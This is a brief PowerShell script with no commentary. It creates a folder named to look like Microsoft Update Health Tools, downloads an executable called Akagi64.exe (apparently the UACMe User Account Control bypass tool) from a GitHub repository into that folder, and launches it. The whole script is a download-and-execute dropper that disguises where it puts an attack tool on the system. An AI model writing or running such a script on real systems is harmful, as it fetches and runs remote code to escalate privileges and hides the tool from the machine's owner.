$dir = 'C:\Program Files\Microsoft Update Health Tools\Tools'
New-Item -ItemType Directory -Path $dir -Force | Out-Null

$exe = Join-Path $dir 'Akagi64.exe'
Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/Akagi64.exe' -OutFile $exe -UseBasicParsing

Start-Process $exe
